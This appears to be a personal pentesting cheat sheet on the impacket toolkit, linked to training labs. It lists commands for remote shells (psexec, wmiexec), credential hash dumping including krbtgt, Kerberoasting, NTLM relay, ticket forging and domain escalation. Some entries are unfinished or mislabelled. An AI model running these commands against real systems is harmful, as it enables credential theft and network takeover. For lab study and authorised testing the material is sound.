# impacket

[![windowsprivesc20](../../../../cybersecurity/_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-lg-2"><div>

[impacket](https://github.com/fortra/impacket) <small>(14.0k ⭐)</small> is a collection of [python](/programming-languages/high-level/scripting/python/index.md) classes for working with network protocols. They are already installed on Kali:

```shell!
$ impacket-secretsdump -h # Example of calling a script
```

You could also install them using `pipx`:

```shell!
$ pipx install git+https://github.com/fortra/impacket
$ secretsdump.py -h # Example of calling a script
```
</div><div>

You may also want to install them manually <small>(dirty/may not work)</small>:

```shell!
$ DEST="$HOME/tools/impacket"
$ git clone -b "master" "https://github.com/fortra/impacket" $DEST
$ pip install --user -r $DEST/requirements.txt
$ pip install --user $DEST
$ python $DEST/examples/secretsdump.py [...]
```

📚 You can refer to [thehacker.recipes](https://tools.thehacker.recipes/impacket) for a list of scripts.
</div></div>

<hr class="sep-both">

## Impacket Overview

<div class="row row-cols-lg-2"><div>

#### Impacket 'target' parameter

Most scripts operating require a **target** such as `username@IP`. You can specify the password within the command.

```shell!
$ impacket-xxx username@IP
$ impacket-xxx username@IP -no-pass
$ impacket-xxx username:password@IP
$ impacket-xxx username:password@IP -windows-auth
$ impacket-xxx domain/username:'password'@IP
```

`-windows-auth` can be specified to indicate that we want to use local authentication <small>(`.\username`)</small> instead of Active Directory authentication.
</div><div>

#### Impacket Alternative Logins

On Linux, as per to these [notes](/operating-systems/cloud/active-directory/security/index.md#active-directory-on-linux), you can log in to active directory and get a TGT ticket. To use it with impacket tools, use `-k` and `-no-pass`.

```shell!
$ impacket-xxx DC01.example.com -no-pass -k
```
</div></div>

<hr class="sep-both">

## Impacket Clients

<div class="row row-cols-lg-2"><div>

#### mssqlclient

Connect to a MSSQL database.

```shell!
$ impacket-mssqlclient username@IP
$ impacket-mssqlclient username:password@IP
$ impacket-mssqlclient username:password@IP -windows-auth
$ impacket-smbclient -no-pass domain\username@IP -hashes lmhash:nthash
SQL> exit
```

#### smbclient

Connect to a SMB server.

```shell!
$ impacket-smbclient 'username':'password'@IP
$ impacket-smbclient IP
smbclient> shares
smbclient> use share_name
smbclient> ls
smbclient> tree
```
</div><div>

#### wmiexec

Pop a semi-interactive shell using [DCOM](/operating-systems/networking/protocols/dcom.md). It runs commands as Local Administrator if possible, but creates a new process per command.

```shell!
$ impacket-wmiexec -shell-type powershell username:password@IP
$ impacket-wmiexec -shell-type powershell username:password@IP "hostname"
```

#### smbexec

XXX.

```shell!
$ impacket-smbexec username:password@IP
```

#### psexec

Pop a semi-interactive remote shell using RemComSvc. It runs commands as SYSTEM to it's quite suspicious and making noise.

```shell!
$ impacket-psexec username:password@IP
$ impacket-psexec [...] -hashes lmhash:nthash
$ impacket-psexec [...] -hashes :nthash
$ impacket-psexec [...] -target-ip 172.16.5.5
$ impacket-psexec [...] -k -no-pass
```
</div></div>

<hr class="sep-both">

## Impacket Servers

<div class="row row-cols-lg-2"><div>

#### smbserver

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Run a [SMB](../smb.md) server to which user will connect with the username XXX and the password YYY. Files will be stored in `/path/to/share`.

```shell!
$ # impacket-smbserver -smb2support share_name /path/to/share
$ impacket-smbserver -smb2support share .
$ # impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
$ impacket-smbserver -smb2support -username username -password password share .
```
</div><div>
</div></div>

<hr class="sep-both">

## Windows Utilities

<div class="row row-cols-lg-2"><div>

#### secretsdump

[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

Dump hashes from a backup of SAM and SYSTEM hashes. There are local credentials and domain cached credentials.

```shell!
$ impacket-secretsdump -sam XXX -system YYY LOCAL
$ impacket-secretsdump -sam XXX -security XXX -system XXX LOCAL
$ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL
$ impacket-secretsdump [...] -outputfile cracked 
<output format is explained in the output>
```

You can remotely dump hashes using:

```shell!
$ impacket-secretsdump domain/username:password@target
$ impacket-secretsdump [...] -just-dc # ???
$ impacket-secretsdump [...] -just-dc-user krbtgt
$ impacket-secretsdump [...] -just-dc-user 'example.com/username'
$ impacket-secretsdump [...] -outputfile hashes
$ impacket-secretsdump [...] -hashes lmhash:nthash
$ impacket-secretsdump [...] -dc-ip IP
```

#### ticketConverter

Convert tickets.

```shell!
$ impacket-ticketConverter xxx yyy.kirbi # from ccache to kirbi
$ impacket-ticketConverter xxxx.bin xxx.kirbi # same
$ impacket-ticketConverter xxx.kirbi xxx.ccache # from kirbi to ccache
```
</div><div>

#### GetUserSPNs

Refer to Kerberoasting.

```shell!
$ impacket-GetUserSPNs EXAMPLE.COM/username -k -no-pass
$ impacket-GetUserSPNs EXAMPLE.COM/username@EXAMPLE.COM -k -no-pass
$ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
$ impacket-GetUserSPNs [...] -request # get TGS for all
$ impacket-GetUserSPNs [...] -request-user cn
$ impacket-GetUserSPNs [...] -outputfile cn_tgs
$ impacket-GetUserSPNs [...] -target-domain dev.example.com
```

#### GetNPUsers

Refer to asreproasting.

```shell!
$ impacket-GetNPUsers -dc-ip DC01 domain/username:password
$ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
```

#### GetNPUsers

Refer to GPO Passwords.

```shell!
$ impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
```

</div></div>

<hr class="sep-both">

## Impacket MS-RPC Utilities

<div class="row row-cols-lg-2"><div>

Refer to [MS-RPC](/operating-systems/networking/protocols/rpc.md#rpc-smb-footprinting).

#### samrdump

List users and domains.

```shell!
$ impacket-samrdump IP
$ impacket-samrdump username:password@IP
```

#### lookupsid

Expose the domain SID and groups/usernames RID using brute force.

```shell!
$ impacket-lookupsid username:password@IP
$ impacket-lookupsid -domain-sids username:password@IP
```
</div><div>

#### rpcdump

```shell!
$ impacket-rpcdump @DCIP
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

```shell!
$ impacket-dpapi unprotect -file xxx -key "xxx"
$ impacket-dpapi masterkey -file H-I-J-K-L -sid S-A-B-C-D-E-F-G -password password
```

```shell!
$ impacket-ntlmrelayx --no-http-server -smb2support -t IP -c '<command>'
$ impacket-ntlmrelayx -debug -smb2support --target http://target/certsrv/certfnsh.asp --adcs --template DomainController
$ impacket-ntlmrelayx --no-http-server -smb2support -t IP -c '<command>'
```
```shell!
$ impacket-ticketer -nthash <krbtgt hash> -domain dev.example.com -domain-sid <child domain SID> -extra-sid <target domain SID> dummy
```
</div><div>

```shell!
$ impacket-raiseChild -target-exec 172.16.5.5 dev.example.com/username:password
```
</div></div>